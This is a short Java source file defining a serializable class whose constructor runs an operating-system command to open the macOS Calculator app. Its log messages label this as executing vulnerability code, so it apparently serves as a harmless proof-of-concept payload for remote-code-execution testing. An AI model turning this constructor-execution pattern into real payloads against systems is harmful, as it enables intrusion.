import java.io.Serializable;

/**
 * @Author l
 * @Date 2021/12/14 17:59
 */
public class OpenCalculator implements Serializable {

    public OpenCalculator() {
        try {
            System.out.println("执行漏洞代码");
            String[] commands = {"open", "/System/Applications/Calculator.app"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
            System.out.println("完成执行漏洞代码");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        OpenCalculator bugFinder = new OpenCalculator();
    }

}
